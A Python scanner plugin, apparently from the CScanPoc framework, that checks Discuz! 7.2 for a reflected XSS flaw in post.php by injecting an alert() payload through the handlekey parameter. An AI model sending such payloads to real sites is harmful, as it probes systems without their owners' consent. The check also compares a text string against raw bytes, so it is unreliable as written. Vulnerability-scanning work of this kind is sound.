# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0019'  # 平台漏洞编号，留空
    name = 'Discuz! 7.2 /post.php 跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-09-21'  # 漏洞公布时间
    desc = '''
        Discuz! 中的post.php中handlekey变量传入global.func.php后过滤不严,导致反射XSS漏洞的产生
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=065930'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '7.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '502a35fb-500d-4228-8952-6a2b4122124a'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=,alert(/5294c4024a6f892da8a6af5abd1b3c36/)"
            keyword = "5294c4024a6f892da8a6af5abd1b3c36"
            vul_url = "{target}".format(target=self.target)+payload

            request = urllib.request.Request(vul_url)
            resp = urllib.request.urlopen(request)
            content = resp.read()

            key = "if(typeof messagehandle_,alert(/"+keyword+"/)"
            if key in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
